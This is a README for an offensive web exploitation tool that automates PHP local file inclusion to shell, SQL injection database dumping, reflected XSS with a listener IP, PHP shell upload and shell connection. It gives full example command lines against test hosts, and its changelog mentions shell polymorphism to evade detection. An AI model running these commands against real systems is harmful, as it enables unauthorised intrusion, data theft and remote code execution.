# SnappingTurtle: A Web Exploitation Tool
A cross platform web exploitation tool written in Aphid and compiled into Python. Currently supports exploitation of PHP local file inclusion and SQL injection with more on the way.

## Command Line Arguments
python st.py [exploitation strategy] [url] [inputs]

## Exploitation Strategies

#### lfi
Local file inclusion mode. Attempts to create a shell by exploiting PHP local file inclusion. Injection is performed using the $lfi token.

#### sqli {options}
SQL injection mode. Attempts to automatically exploit SQL injection vulnerabilities by querying information schemas. Injection is performed using the $sqli token.

If used, one of two options must be specified:

*list* - Dumps a list of databases and tables.

*table {name}* - Dumps a database table.

#### xss {server ip}
Cross-site scripting mode. Currently only supports exploitation of reflected XSS via GET. Injection is performed using the $xss token.

If used, a target accessible server IP must be specified for listening.

#### upload
Arbitrary upload. Write data to the server using the -f option.

If used, at least one file must be specified using the -f option. Built-in shells can be injected using the $php token.

#### shell {shell url}
Connects to a previously created shell.

## Url
The url to exploit. Can be injected into using tokens.

## Inputs

#### -g {GET name} {GET value}
GET data in key/value format.
  
#### -p {POST name} {POST value}
POST data in key/value format.

#### --g {GET data}
GET data in Python map format.

#### --p {POST data}
POST data in Python map format.

#### -f {name} {filename} {file data}
POST data as a file.

## Examples

python st.py lfi http://localhost/lfiTest.php?theme=$lfi

python st.py lfi http://localhost/lfiTest.php -g theme $lfi

python st.py lfi http://localhost/lfiTest.php?theme=$lfi%00

python st.py lfi http://localhost/postTest.php --p "{'theme':'$lfi'}"

python st.py sqli list http://localhost/sqliTest.php -g email $sqli

python st.py sqli table sqlitest.users http://localhost/sqliTest.php -g email $sqli

python st.py xss 10.0.0.122 http://10.0.0.145/xss.php -g search $xss

python st.py upload http://10.0.0.145/upload.php -f file shell.php $php

python st.py shell http://10.0.0.145/shell.php

## Changelog

### 0.1.0409.1609
Improved PHP shell polymorphism.

Multiple reliability improvements for LFI to RCE.

Several functional improvements to SQL injection.

### 0.1.0324.1445
Added upload capability.

Added shell connection support.

Improved CLI output.

Flipped GET/POST pair/obj args.

Fixed SQL injection NULL bug.

Fixed bug in table printing.

Disabled urllib2 redirection.

### 0.1.0323.1150
Added support for XSS exploitation.

Several bug fixes.

### 0.1.0322.749
Added support for SQL injection.

Improved LFI exploitation support.

CLI improvements.

Several bug fixes.

### 0.1.0316.3
Initial release, supports LFI exploitation.
